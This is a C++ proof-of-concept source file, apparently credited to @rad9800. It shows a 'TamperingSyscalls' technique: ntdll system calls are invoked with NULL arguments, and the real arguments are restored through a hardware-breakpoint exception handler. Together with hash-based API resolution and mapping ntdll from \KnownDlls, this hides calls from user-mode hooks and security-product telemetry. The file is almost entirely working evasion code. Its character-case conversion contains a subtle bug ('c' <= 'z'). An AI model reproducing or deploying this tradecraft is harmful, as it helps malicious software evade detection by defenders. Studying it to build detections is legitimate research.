/*++
TamperingSyscalls with all argument spoofing by @rad9800
Now we can restore all arguments, now not limited to x64 ABI
([rcx, rdx, r8, r9]) which was a limitation of the previous PoC.
with simple manipulation of the stack. We call with NULL for all
the initial arguments and then restore it as necessary in the 
exception handler.

This is just a small example of >4 arguments....
--*/
#include <Windows.h>
#include <winternl.h>

constexpr ULONG HashStringFowlerNollVoVariant1a( const char* String );
constexpr ULONG HashStringFowlerNollVoVariant1a( const wchar_t* String );

#pragma region macros

#define _DEBUG 1
#if _DEBUG == 0
#define PRINT( STR, ... )
#else
#define PRINT( STR, ... )                                                                   \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );			\
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  
#endif

#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

template <typename Type>
inline Type RVA2VA( LPVOID Base, LONG Rva ) {
	return (Type)((ULONG_PTR)Base + Rva);
}

#define HASHALGO HashStringFowlerNollVoVariant1a         // specify algorithm here

#pragma region HashStringFowlerNollVoVariant1a

constexpr ULONG HashStringFowlerNollVoVariant1a( const char* String )
{
	ULONG Hash = 0x811c9dc5;

	while( *String )
	{
		Hash ^= (UCHAR)*String++;
		Hash *= 0x01000193;
	}

	return Hash;
}

constexpr ULONG HashStringFowlerNollVoVariant1a( const wchar_t* String )
{
	ULONG Hash = 0x811c9dc5;

	while( *String )
	{
		Hash ^= (UCHAR)*String++;
		Hash *= 0x01000193;
	}

	return Hash;
}
#pragma endregion

#define TOKENIZE( x ) #x
#define CONCAT( X, Y ) X##Y
#define hash( VAL ) constexpr auto CONCAT( hash, VAL ) = HASHALGO( TOKENIZE( VAL ) );							
#define dllhash(DLL, VAL ) constexpr auto CONCAT( hash, DLL ) = HASHALGO( VAL );												

dllhash( NTDLL, L"NTDLL.DLL" )
#pragma endregion

#pragma region structs
// Can't do it for NtResumeThread or NtSetEvent as these are used after the hardware breakpoint is set.
// Need to make a struct with the arguments.
typedef struct {
	HANDLE                     SectionHandle;
	HANDLE                     ProcessHandle;
	PVOID                      BaseAddress;
	ULONG                      ZeroBits;
	SIZE_T                     CommitSize;
	PLARGE_INTEGER             SectionOffset;
	PSIZE_T                    ViewSize;
	DWORD					   InheritDisposition;
	ULONG                      AllocationType;
	ULONG                      Win32Protect;
} NtMapViewOfSectionArgs;

typedef struct {
	HANDLE					   ProcessHandle;
	PVOID                      BaseAddress;
} NtUnmapViewOfSectionArgs;

typedef struct {
	PHANDLE                    SectionHandle;
	ACCESS_MASK                DesiredAccess;
	POBJECT_ATTRIBUTES         ObjectAttributes;
} NtOpenSectionArgs;


typedef struct {
	int		index;
	LPVOID	arguments;
} STATE;
#pragma endregion

#pragma region typedefs
typedef NTSTATUS( NTAPI* typeNtMapViewOfSection )(
	HANDLE                   SectionHandle,
	HANDLE                   ProcessHandle,
	PVOID                    BaseAddress,
	ULONG                    ZeroBits,
	SIZE_T                   CommitSize,
	PLARGE_INTEGER           SectionOffset,
	PSIZE_T                  ViewSize,
	DWORD			         InheritDisposition,
	ULONG                    AllocationType,
	ULONG                    Win32Protect
	);

typedef NTSTATUS( NTAPI* typeNtUnmapViewOfSection )(
	HANDLE                   ProcessHandle,
	PVOID                    BaseAddress
	);

typedef NTSTATUS( NTAPI* typeNtOpenSection )(
	PHANDLE                  SectionHandle,
	ACCESS_MASK              DesiredAccess,
	POBJECT_ATTRIBUTES       ObjectAttributes
	);
#pragma endregion

// Need to make a global variable of our struct (which we fix the arguments in the handler)
//NtGetContextThreadArgs pNtGetThreadContextArgs;
NtMapViewOfSectionArgs pNtMapViewOfSectionArgs;
NtUnmapViewOfSectionArgs pNtUnmapViewOfSectionArgs;
NtOpenSectionArgs pNtOpenSectionArgs;

NTSTATUS pNtMapViewOfSection( HANDLE SectionHandle, HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect );
NTSTATUS pNtUnmapViewOfSection( HANDLE ProcessHandle, PVOID BaseAddress );
NTSTATUS pNtOpenSection( PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes );

// enums
enum
{
	NTMAPVIEWOFSECTION_ENUM = 0,
	NTUNMAPVIEWOFSECTION_ENUM,
	NTOPENSECTION_ENUM
};

// Need to setup states in order you call the functions.
STATE StateArray[] = {
	{ NTMAPVIEWOFSECTION_ENUM,		&pNtMapViewOfSectionArgs	},
	{ NTUNMAPVIEWOFSECTION_ENUM,	&pNtUnmapViewOfSectionArgs	},
	{ NTOPENSECTION_ENUM,			&pNtOpenSectionArgs			}
};

DWORD EnumState;

LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo );

LPVOID FindSyscallAddress( LPVOID function );

VOID SetOneshotHardwareBreakpoint( LPVOID address );

PVOID GetProcAddrExH( UINT funcHash, UINT moduleHash );

void RtlInitUnicodeString( PUNICODE_STRING target, PCWSTR source );

int main()
{
	SetUnhandledExceptionFilter( OneShotHardwareBreakpointHandler );

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	LPVOID FunctionAddress = NULL;
	NTSTATUS status = 0;

	PVOID addr = NULL;
	ULONG_PTR size = NULL;
	HANDLE section = INVALID_HANDLE_VALUE;
	UNICODE_STRING uni;
	OBJECT_ATTRIBUTES oa;
	WCHAR buffer[MAX_PATH] = L"\\KnownDlls\\ntdll.dll";

	RtlInitUnicodeString( &uni, buffer );
	InitializeObjectAttributes( &oa, &uni, OBJ_CASE_INSENSITIVE, NULL, NULL );

	status = pNtOpenSection( &section, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa );
	if( NT_SUCCESS( status ) ) {
		PRINT( "Success : 0x%x\n", status );
	}
	else {
		PRINT( "Error : 0x%x\n", status );
	}

	status = pNtMapViewOfSection( section, NtCurrentProcess(), &addr, 0, 0, NULL, &size, 1, 0, PAGE_READONLY );
	if( NT_SUCCESS( status ) ) {
		PRINT( "Success : 0x%x\n", status );
	}
	else {
		PRINT( "Error : 0x%x\n", status );
	}

	status = pNtUnmapViewOfSection( NtCurrentProcess(), addr );
	if( NT_SUCCESS( status ) ) {
		PRINT( "Success : 0x%x\n", status );
	}
	else {
		PRINT( "Error : 0x%x\n", status );
	}

	return 0;
}

LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo )
{
	if( ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP )
	{
		if( ExceptionInfo->ContextRecord->Dr7 & 1 ) {
			// if the ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0 
			// then we are at the one shot breakpoint address
			// ExceptionInfo->ContextRecord->Rax should hold the syscall number
			PRINT( "Syscall : 0x%x\n", ExceptionInfo->ContextRecord->Rax );
			if( ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0 ) {
				ExceptionInfo->ContextRecord->Dr0 = 0;

				switch( EnumState ) {
				
				case NTMAPVIEWOFSECTION_ENUM:

					PRINT("R10\t: 0x%x\n", ExceptionInfo->ContextRecord->R10);
					PRINT("Rdx\t: 0x%x\n", ExceptionInfo->ContextRecord->Rdx);
					PRINT("R8\t: 0x%p\n", ExceptionInfo->ContextRecord->R8);
					PRINT("R9\t: 0x%x\n", ExceptionInfo->ContextRecord->R9);
					PRINT("RSP\t: 0x%p\n", ExceptionInfo->ContextRecord->Rsp);
					PRINT("*RSP\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp));
					
					PRINT("*RSP + 0x28\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x28));
					PRINT("*RSP + 0x30\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x30));
					PRINT("*RSP + 0x38\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x38));
					PRINT("*RSP + 0x40\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x40));
					PRINT("*RSP + 0x48\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x48));
					PRINT("*RSP + 0x50\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x50));
					
					ExceptionInfo->ContextRecord->R10 = (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->SectionHandle;
					ExceptionInfo->ContextRecord->Rdx =	(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ProcessHandle;
					ExceptionInfo->ContextRecord->R8 =	(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->BaseAddress;
					ExceptionInfo->ContextRecord->R9 =	(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ZeroBits;

					// We start at 0x28 as 0x8 for stack alignment then 0x20 for shadow space (not always used - 0x8 * 4-[rcx, rdx, r8, r9])
					*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x28) = (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->CommitSize;
					*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x30) = (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->SectionOffset;
					*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x38) = (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ViewSize;
					*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x40) = (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->InheritDisposition;
					*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x48) = (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->AllocationType;
					*(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x50) = (DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->Win32Protect;
					
					PRINT("===========================\n");

					PRINT("*RSP + 0x28\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x28));
					PRINT("*RSP + 0x30\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x30));
					PRINT("*RSP + 0x38\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x38));
					PRINT("*RSP + 0x40\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x40));
					PRINT("*RSP + 0x48\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x48));
					PRINT("*RSP + 0x50\t: 0x%p\n", *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + 0x50));

					break;

				case NTUNMAPVIEWOFSECTION_ENUM:
					ExceptionInfo->ContextRecord->R10 =
						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ProcessHandle;

					ExceptionInfo->ContextRecord->Rdx =
						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[EnumState].arguments))->BaseAddress;

					break;

				case NTOPENSECTION_ENUM:
					ExceptionInfo->ContextRecord->R10 =
						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->SectionHandle;

					ExceptionInfo->ContextRecord->Rdx =
						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->DesiredAccess;

					ExceptionInfo->ContextRecord->R8 =
						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->ObjectAttributes;

					break;

					// you have messed up by not providing the indexed state
				default:
					ExceptionInfo->ContextRecord->Rip += 1;	// just so we don't hang
					break;
				}
				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

VOID SetOneshotHardwareBreakpoint( LPVOID address )
{
	CONTEXT context = { 0 };
	context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	GetThreadContext( GetCurrentThread(), &context );

	context.Dr0 = (DWORD64)address;
	context.Dr6 = 0;
	context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 16)) | (0 << 16);
	context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 18)) | (0 << 18);
	context.Dr7 = (context.Dr7 & ~(((1 << 1) - 1) << 0)) | (1 << 0);

	context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	SetThreadContext( GetCurrentThread(), &context );

	return;
}

/// + 0x12 generally 
LPVOID FindSyscallAddress( LPVOID function )
{
	BYTE stub[] = { 0x0F, 0x05 };
	for( unsigned int i = 0; i < (unsigned int)25; i++ )
	{
		if( memcmp( (LPVOID)((DWORD_PTR)function + i), stub, 2 ) == 0 ) {
			return (LPVOID)((DWORD_PTR)function + i);
		}
	}
	return NULL;
}

void RtlInitUnicodeString( PUNICODE_STRING target, PCWSTR source )
{
	if( (target->Buffer = (PWSTR)source) )
	{
		unsigned int length = wcslen( source ) * sizeof( WCHAR );
		if( length > 0xfffc )
			length = 0xfffc;

		target->Length = length;
		target->MaximumLength = target->Length + sizeof( WCHAR );
	}
	else target->Length = target->MaximumLength = 0;
}

PVOID GetProcAddrExH( UINT funcHash, UINT moduleHash )
{
	PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
	LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* next = head->Flink;
	PVOID base = NULL;

	while( next != head )
	{
		LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((PBYTE)next - offsetof( LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ));

		UNICODE_STRING* fullname = &entry->FullDllName;
		UNICODE_STRING* basename = (UNICODE_STRING*)((PBYTE)fullname + sizeof( UNICODE_STRING ));

		char  name[64];
		if( basename->Length < sizeof( name ) - 1 )
		{
			int i = 0;
			while( basename->Buffer[i] && i < sizeof( name ) - 1 )
			{
				name[i] = (basename->Buffer[i] >= 'a' && 'c' <= 'z') ? basename->Buffer[i] - 'a' + 'A' : basename->Buffer[i];
				i++;
			}
			name[i] = 0;
			UINT hash = HASHALGO( name );
			// is this our moduleHash?
			if( hash == moduleHash ) {
				base = entry->DllBase;

				PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
				PIMAGE_NT_HEADERS nt = RVA2VA<PIMAGE_NT_HEADERS>( base, dos->e_lfanew );

				PIMAGE_EXPORT_DIRECTORY exports = RVA2VA<PIMAGE_EXPORT_DIRECTORY>( base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
				if( exports->AddressOfNames != 0 )
				{
					PWORD ordinals = RVA2VA<PWORD>( base, exports->AddressOfNameOrdinals );
					PDWORD names = RVA2VA<PDWORD>( base, exports->AddressOfNames );
					PDWORD functions = RVA2VA<PDWORD>( base, exports->AddressOfFunctions );

					for( DWORD i = 0; i < exports->NumberOfNames; i++ ) {
						LPSTR name = RVA2VA<LPSTR>( base, names[i] );
						if( HASHALGO( name ) == funcHash ) {
							PBYTE function = RVA2VA<PBYTE>( base, functions[ordinals[i]] );
							return function;
						}
					}
				}
			}
		}
		next = next->Flink;
	}

	return NULL;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/// Wrappers
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


NTSTATUS pNtMapViewOfSection( HANDLE SectionHandle, HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect ) {
	LPVOID FunctionAddress;
	NTSTATUS status;
	hash( NtMapViewOfSection );
	FunctionAddress = GetProcAddrExH( hashNtMapViewOfSection, hashNTDLL );    typeNtMapViewOfSection fNtMapViewOfSection;

	pNtMapViewOfSectionArgs.SectionHandle = SectionHandle;
	pNtMapViewOfSectionArgs.ProcessHandle = ProcessHandle;
	pNtMapViewOfSectionArgs.BaseAddress = BaseAddress;
	pNtMapViewOfSectionArgs.ZeroBits = ZeroBits;
	pNtMapViewOfSectionArgs.CommitSize = CommitSize;
	pNtMapViewOfSectionArgs.SectionOffset = SectionOffset;
	pNtMapViewOfSectionArgs.ViewSize = ViewSize;
	pNtMapViewOfSectionArgs.InheritDisposition = InheritDisposition;
	pNtMapViewOfSectionArgs.AllocationType = AllocationType;
	pNtMapViewOfSectionArgs.Win32Protect = Win32Protect;
	fNtMapViewOfSection = (typeNtMapViewOfSection)FunctionAddress;

	EnumState = NTMAPVIEWOFSECTION_ENUM;

	SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress ) );
	status = fNtMapViewOfSection( NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );

	return status;
}

NTSTATUS pNtUnmapViewOfSection( HANDLE ProcessHandle, PVOID BaseAddress ) {
	LPVOID FunctionAddress;
	NTSTATUS status;
	hash( NtUnmapViewOfSection );
	FunctionAddress = GetProcAddrExH( hashNtUnmapViewOfSection, hashNTDLL );

	typeNtUnmapViewOfSection fNtUnmapViewOfSection;

	pNtUnmapViewOfSectionArgs.ProcessHandle = ProcessHandle;
	pNtUnmapViewOfSectionArgs.BaseAddress = BaseAddress;
	fNtUnmapViewOfSection = (typeNtUnmapViewOfSection)FunctionAddress;

	EnumState = NTUNMAPVIEWOFSECTION_ENUM;

	SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress ) );
	status = fNtUnmapViewOfSection( NULL, NULL );
	return status;
}

NTSTATUS pNtOpenSection( PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes ) {
	LPVOID FunctionAddress;
	NTSTATUS status;
	hash( NtOpenSection );
	FunctionAddress = GetProcAddrExH( hashNtOpenSection, hashNTDLL );

	typeNtOpenSection fNtOpenSection;

	pNtOpenSectionArgs.SectionHandle = SectionHandle;
	pNtOpenSectionArgs.DesiredAccess = DesiredAccess;
	pNtOpenSectionArgs.ObjectAttributes = ObjectAttributes;
	fNtOpenSection = (typeNtOpenSection)FunctionAddress;

	EnumState = NTOPENSECTION_ENUM;

	SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress ) );
	status = fNtOpenSection( NULL, NULL, NULL );
	return status;
}
